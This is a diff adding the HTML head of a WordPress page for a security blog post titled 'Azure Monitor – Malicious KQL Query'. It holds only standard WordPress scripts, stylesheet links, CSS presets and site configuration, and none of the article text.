@@ -1,0 +1,1178 @@
+<html lang="fi"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="https://securecloud.blog/xmlrpc.php">
+<title>Azure Monitor – Malicious KQL Query – SecureCloudBlog</title>
+<meta name="robots" content="max-image-preview:large">
+
+<!-- Async WordPress.com Remote Login -->
+
+<link rel="dns-prefetch" href="//s0.wp.com">
+<link rel="dns-prefetch" href="//widgets.wp.com">
+<link rel="dns-prefetch" href="//wordpress.com">
+<link rel="dns-prefetch" href="//fonts-api.wp.com">
+<link rel="alternate" type="application/rss+xml" title="SecureCloudBlog » syöte" href="https://securecloud.blog/feed/">
+<link rel="alternate" type="application/rss+xml" title="SecureCloudBlog » kommenttien syöte" href="https://securecloud.blog/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="SecureCloudBlog » Azure Monitor – Malicious KQL&nbsp;Query kommenttien syöte" href="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/feed/">
+	<script type="text/javascript">
+		/* <![CDATA[ */
+		function addLoadEvent(func) {
+			var oldonload = window.onload;
+			if (typeof window.onload != 'function') {
+				window.onload = func;
+			} else {
+				window.onload = function () {
+					oldonload();
+					func();
+				}
+			}
+		}
+		/* ]]> */
+	</script>
+	<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s0.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1710334132i&ver=6.6-beta2-58412"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-0-1" href="https://s0.wp.com/_static/??-eJxtzFsKgCAQheENZaMg+BStRXQI80oz0vbDCILo5cAHhx/OJlwtjIUhd9FS30Ih2JGbdfEx5FrH+J6Q4MBkGb1olfij2RFN8J9MIeIbvjXua16UUUZLLY3eL2BkNNM=&amp;cssminify=yes" type="text/css" media="all">
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-2-1" href="https://s0.wp.com/_static/??-eJylzFsKgCAQQNENlcNAD3+itaQNZo0WPgp3n7SFPi8XDjxXq0+fyCe4OBvrI5hcU1Ew9QSCG6XoBILKlldQfOqjZavCEgrEVJiEjrGBf1DayH3Q7CYccehHib3cXybLOGM=&amp;cssminify=yes" type="text/css" media="all">
+<style id="wp-block-library-inline-css">
+.has-text-align-justify {
+	text-align:justify;
+}
+.has-text-align-justify{text-align:justify;}
+</style>
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-4-1" href="https://s0.wp.com/_static/??-eJzTLy/QzcxLzilNSS3WzyrWz01NyUxMzUnNTc0rQeEU5CRWphbp5qSmJyZX6uVm5uklFxfr6OPTDpRD5sM02efaGpoZmFkYGRuZGmQBAHPvL0Y=&amp;cssminify=yes" type="text/css" media="all">
+<style id="jetpack-sharing-buttons-style-inline-css">
+.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
+</style>
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-6-1" href="https://s0.wp.com/_static/??-eJyVjEEOwiAQAD/ksgGN4sH4Fko3hJYCYZea/r49mF6Nx0lmBj8VfMlCWbCmHmJmDP3AgVqAIRU/M04k1fkZkttKFwgtjsiyJVKe+YL/LJqTmAP/yH35ZkZpqzRwXGoiaLSqG46R5TTgHL2Xl75bba/GPB/TDthVT3U=&amp;cssminify=yes" type="text/css" media="all">
+<style id="classic-theme-styles-inline-css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-8-1" href="https://s0.wp.com/_static/??-eJx9jcEKg0AMRH+oaVhorR7Eb9E16IpZg8min2889FZ6GYbhPQYPgbhlo2zIBWQtU8qKcdvJd5be0AmmMfW0Ejv2jKoP/K0daZzIXNdvB6PzvyJ+A8MgO6mCJ6fCYLN/6e113IZXU9WfUL/DcgHSTkDo&amp;cssminify=yes" type="text/css" media="all">
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--dark: #1a1a1a;--wp--preset--color--light-grey: #f4f4f4;--wp--preset--color--light-blue: #51a8dd;--wp--preset--color--dark-blue: #0c6ca6;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--regular: 19px;--wp--preset--font-size--larger: 26px;--wp--preset--font-family--albert-sans: 'Albert Sans', sans-serif;--wp--preset--font-family--alegreya: Alegreya, serif;--wp--preset--font-family--arvo: Arvo, serif;--wp--preset--font-family--bodoni-moda: 'Bodoni Moda', serif;--wp--preset--font-family--bricolage-grotesque: 'Bricolage Grotesque', sans-serif;--wp--preset--font-family--cabin: Cabin, sans-serif;--wp--preset--font-family--chivo: Chivo, sans-serif;--wp--preset--font-family--commissioner: Commissioner, sans-serif;--wp--preset--font-family--cormorant: Cormorant, serif;--wp--preset--font-family--courier-prime: 'Courier Prime', monospace;--wp--preset--font-family--crimson-pro: 'Crimson Pro', serif;--wp--preset--font-family--dm-mono: 'DM Mono', monospace;--wp--preset--font-family--dm-sans: 'DM Sans', sans-serif;--wp--preset--font-family--dm-serif-display: 'DM Serif Display', serif;--wp--preset--font-family--domine: Domine, serif;--wp--preset--font-family--eb-garamond: 'EB Garamond', serif;--wp--preset--font-family--epilogue: Epilogue, sans-serif;--wp--preset--font-family--fahkwang: Fahkwang, sans-serif;--wp--preset--font-family--figtree: Figtree, sans-serif;--wp--preset--font-family--fira-sans: 'Fira Sans', sans-serif;--wp--preset--font-family--fjalla-one: 'Fjalla One', sans-serif;--wp--preset--font-family--fraunces: Fraunces, serif;--wp--preset--font-family--gabarito: Gabarito, system-ui;--wp--preset--font-family--ibm-plex-mono: 'IBM Plex Mono', monospace;--wp--preset--font-family--ibm-plex-sans: 'IBM Plex Sans', sans-serif;--wp--preset--font-family--ibarra-real-nova: 'Ibarra Real Nova', serif;--wp--preset--font-family--instrument-serif: 'Instrument Serif', serif;--wp--preset--font-family--inter: Inter, sans-serif;--wp--preset--font-family--josefin-sans: 'Josefin Sans', sans-serif;--wp--preset--font-family--jost: Jost, sans-serif;--wp--preset--font-family--libre-baskerville: 'Libre Baskerville', serif;--wp--preset--font-family--libre-franklin: 'Libre Franklin', sans-serif;--wp--preset--font-family--literata: Literata, serif;--wp--preset--font-family--lora: Lora, serif;--wp--preset--font-family--merriweather: Merriweather, serif;--wp--preset--font-family--montserrat: Montserrat, sans-serif;--wp--preset--font-family--newsreader: Newsreader, serif;--wp--preset--font-family--noto-sans-mono: 'Noto Sans Mono', sans-serif;--wp--preset--font-family--nunito: Nunito, sans-serif;--wp--preset--font-family--open-sans: 'Open Sans', sans-serif;--wp--preset--font-family--overpass: Overpass, sans-serif;--wp--preset--font-family--pt-serif: 'PT Serif', serif;--wp--preset--font-family--petrona: Petrona, serif;--wp--preset--font-family--piazzolla: Piazzolla, serif;--wp--preset--font-family--playfair-display: 'Playfair Display', serif;--wp--preset--font-family--plus-jakarta-sans: 'Plus Jakarta Sans', sans-serif;--wp--preset--font-family--poppins: Poppins, sans-serif;--wp--preset--font-family--raleway: Raleway, sans-serif;--wp--preset--font-family--roboto: Roboto, sans-serif;--wp--preset--font-family--roboto-slab: 'Roboto Slab', serif;--wp--preset--font-family--rubik: Rubik, sans-serif;--wp--preset--font-family--rufina: Rufina, serif;--wp--preset--font-family--sora: Sora, sans-serif;--wp--preset--font-family--source-sans-3: 'Source Sans 3', sans-serif;--wp--preset--font-family--source-serif-4: 'Source Serif 4', serif;--wp--preset--font-family--space-mono: 'Space Mono', monospace;--wp--preset--font-family--syne: Syne, sans-serif;--wp--preset--font-family--texturina: Texturina, serif;--wp--preset--font-family--urbanist: Urbanist, sans-serif;--wp--preset--font-family--work-sans: 'Work Sans', sans-serif;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-albert-sans-font-family{font-family: var(--wp--preset--font-family--albert-sans) !important;}.has-alegreya-font-family{font-family: var(--wp--preset--font-family--alegreya) !important;}.has-arvo-font-family{font-family: var(--wp--preset--font-family--arvo) !important;}.has-bodoni-moda-font-family{font-family: var(--wp--preset--font-family--bodoni-moda) !important;}.has-bricolage-grotesque-font-family{font-family: var(--wp--preset--font-family--bricolage-grotesque) !important;}.has-cabin-font-family{font-family: var(--wp--preset--font-family--cabin) !important;}.has-chivo-font-family{font-family: var(--wp--preset--font-family--chivo) !important;}.has-commissioner-font-family{font-family: var(--wp--preset--font-family--commissioner) !important;}.has-cormorant-font-family{font-family: var(--wp--preset--font-family--cormorant) !important;}.has-courier-prime-font-family{font-family: var(--wp--preset--font-family--courier-prime) !important;}.has-crimson-pro-font-family{font-family: var(--wp--preset--font-family--crimson-pro) !important;}.has-dm-mono-font-family{font-family: var(--wp--preset--font-family--dm-mono) !important;}.has-dm-sans-font-family{font-family: var(--wp--preset--font-family--dm-sans) !important;}.has-dm-serif-display-font-family{font-family: var(--wp--preset--font-family--dm-serif-display) !important;}.has-domine-font-family{font-family: var(--wp--preset--font-family--domine) !important;}.has-eb-garamond-font-family{font-family: var(--wp--preset--font-family--eb-garamond) !important;}.has-epilogue-font-family{font-family: var(--wp--preset--font-family--epilogue) !important;}.has-fahkwang-font-family{font-family: var(--wp--preset--font-family--fahkwang) !important;}.has-figtree-font-family{font-family: var(--wp--preset--font-family--figtree) !important;}.has-fira-sans-font-family{font-family: var(--wp--preset--font-family--fira-sans) !important;}.has-fjalla-one-font-family{font-family: var(--wp--preset--font-family--fjalla-one) !important;}.has-fraunces-font-family{font-family: var(--wp--preset--font-family--fraunces) !important;}.has-gabarito-font-family{font-family: var(--wp--preset--font-family--gabarito) !important;}.has-ibm-plex-mono-font-family{font-family: var(--wp--preset--font-family--ibm-plex-mono) !important;}.has-ibm-plex-sans-font-family{font-family: var(--wp--preset--font-family--ibm-plex-sans) !important;}.has-ibarra-real-nova-font-family{font-family: var(--wp--preset--font-family--ibarra-real-nova) !important;}.has-instrument-serif-font-family{font-family: var(--wp--preset--font-family--instrument-serif) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-josefin-sans-font-family{font-family: var(--wp--preset--font-family--josefin-sans) !important;}.has-jost-font-family{font-family: var(--wp--preset--font-family--jost) !important;}.has-libre-baskerville-font-family{font-family: var(--wp--preset--font-family--libre-baskerville) !important;}.has-libre-franklin-font-family{font-family: var(--wp--preset--font-family--libre-franklin) !important;}.has-literata-font-family{font-family: var(--wp--preset--font-family--literata) !important;}.has-lora-font-family{font-family: var(--wp--preset--font-family--lora) !important;}.has-merriweather-font-family{font-family: var(--wp--preset--font-family--merriweather) !important;}.has-montserrat-font-family{font-family: var(--wp--preset--font-family--montserrat) !important;}.has-newsreader-font-family{font-family: var(--wp--preset--font-family--newsreader) !important;}.has-noto-sans-mono-font-family{font-family: var(--wp--preset--font-family--noto-sans-mono) !important;}.has-nunito-font-family{font-family: var(--wp--preset--font-family--nunito) !important;}.has-open-sans-font-family{font-family: var(--wp--preset--font-family--open-sans) !important;}.has-overpass-font-family{font-family: var(--wp--preset--font-family--overpass) !important;}.has-pt-serif-font-family{font-family: var(--wp--preset--font-family--pt-serif) !important;}.has-petrona-font-family{font-family: var(--wp--preset--font-family--petrona) !important;}.has-piazzolla-font-family{font-family: var(--wp--preset--font-family--piazzolla) !important;}.has-playfair-display-font-family{font-family: var(--wp--preset--font-family--playfair-display) !important;}.has-plus-jakarta-sans-font-family{font-family: var(--wp--preset--font-family--plus-jakarta-sans) !important;}.has-poppins-font-family{font-family: var(--wp--preset--font-family--poppins) !important;}.has-raleway-font-family{font-family: var(--wp--preset--font-family--raleway) !important;}.has-roboto-font-family{font-family: var(--wp--preset--font-family--roboto) !important;}.has-roboto-slab-font-family{font-family: var(--wp--preset--font-family--roboto-slab) !important;}.has-rubik-font-family{font-family: var(--wp--preset--font-family--rubik) !important;}.has-rufina-font-family{font-family: var(--wp--preset--font-family--rufina) !important;}.has-sora-font-family{font-family: var(--wp--preset--font-family--sora) !important;}.has-source-sans-3-font-family{font-family: var(--wp--preset--font-family--source-sans-3) !important;}.has-source-serif-4-font-family{font-family: var(--wp--preset--font-family--source-serif-4) !important;}.has-space-mono-font-family{font-family: var(--wp--preset--font-family--space-mono) !important;}.has-syne-font-family{font-family: var(--wp--preset--font-family--syne) !important;}.has-texturina-font-family{font-family: var(--wp--preset--font-family--texturina) !important;}.has-urbanist-font-family{font-family: var(--wp--preset--font-family--urbanist) !important;}.has-work-sans-font-family{font-family: var(--wp--preset--font-family--work-sans) !important;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+</style>
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-10-1" href="https://s0.wp.com/wp-content/mu-plugins/jetpack-mu-wpcom-plugin/moon/vendor/automattic/jetpack-mu-wpcom/src/build/verbum-comments/verbum-comments.css?m=1709200696i&amp;cssminify=yes" type="text/css" media="all">
+<link rel="stylesheet" id="verbum-gutenberg-css-css" href="https://widgets.wp.com/verbum-block-editor/block-editor.css?ver=1717067639" media="all">
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-12-1" href="https://s0.wp.com/_static/??/wp-content/mu-plugins/comment-likes/css/comment-likes.css,/i/noticons/noticons.css?m=1436783281j&amp;cssminify=yes" type="text/css" media="all">
+<link rel="stylesheet" id="nikau-fonts-css" href="https://fonts-api.wp.com/css?family=Noticia+Text%3A400%2C400italic%2C700%2C700italic%7CKanit%3A400%2C500%2C600%2C700&amp;subset=latin%2Clatin-ext" media="all">
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-14-1" href="https://s0.wp.com/_static/??-eJx9js0KAjEMhF/IGlZW0YP4KFJLrOlPWpoW8e2t6KHgspcwH8xMBp5ZmcQVuUJ9YESBXDBSi8DkdQOpr4BbI7KBwRqbyqFZYgGHNWvjfwwxJYYrsQGLjIV6QpblX+nifycggYz/3rUhFpMKyehKfcEI6h40lbVowVtItksL3TXgJ3SJ5+lw3E+70zzP7g2LTXJl&amp;cssminify=yes" type="text/css" media="all">
+<link crossorigin="anonymous" rel="stylesheet" id="print-css-15-1" href="https://s0.wp.com/wp-content/mu-plugins/global-print/global-print.css?m=1465851035i&amp;cssminify=yes" type="text/css" media="print">
+<style id="jetpack-global-styles-frontend-style-inline-css">
+:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
+</style>
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-18-1" href="https://s0.wp.com/_static/??-eJyNjcEKwjAQRH/IuA1aehI/ReImJKmb3eAmFP9eW3oRL16GeTC8gaUaFG6BG5RuKvWYWWEOrTp87AxFZA3fKShocs/gnfevrWaOR1Q9wP+mW2YEFcyODEkU/YIfW0uhfH7TGSLJ3dE6uJaLneww2mkYT/MbUOlJHA==&amp;cssminify=yes" type="text/css" media="all">
+<script type="text/javascript" id="jetpack_related-posts-js-extra">
+/* <![CDATA[ */
+var related_posts_js_options = {"post_heading":"h4"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="media-video-jwt-bridge-js-extra">
+/* <![CDATA[ */
+var videopressAjax = {"ajaxUrl":"https:\/\/securecloud188323504.wordpress.com\/wp-admin\/admin-ajax.php","bridgeUrl":"\/wp-content\/mu-plugins\/jetpack-plugin\/moon\/jetpack_vendor\/automattic\/jetpack-videopress\/build\/lib\/token-bridge.js","post_id":"6481"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="wpcom-actionbar-placeholder-js-extra">
+/* <![CDATA[ */
+var actionbardata = {"siteID":"146690742","postID":"6481","siteURL":"https:\/\/securecloud.blog","xhrURL":"https:\/\/securecloud.blog\/wp-admin\/admin-ajax.php","nonce":"c6abf4f4d7","isLoggedIn":"","statusMessage":"","subsEmailDefault":"instantly","proxyScriptUrl":"https:\/\/s0.wp.com\/wp-content\/js\/wpcom-proxy-request.js?ver=20211021","shortlink":"https:\/\/wp.me\/p9VuXI-1Gx","i18n":{"followedText":"New posts from this site will now appear in your <a href=\"https:\/\/wordpress.com\/read\">Reader<\/a>","foldBar":"Pienenn\u00e4 t\u00e4m\u00e4 palkki","unfoldBar":"Suurenna"}};
+/* ]]> */
+</script>
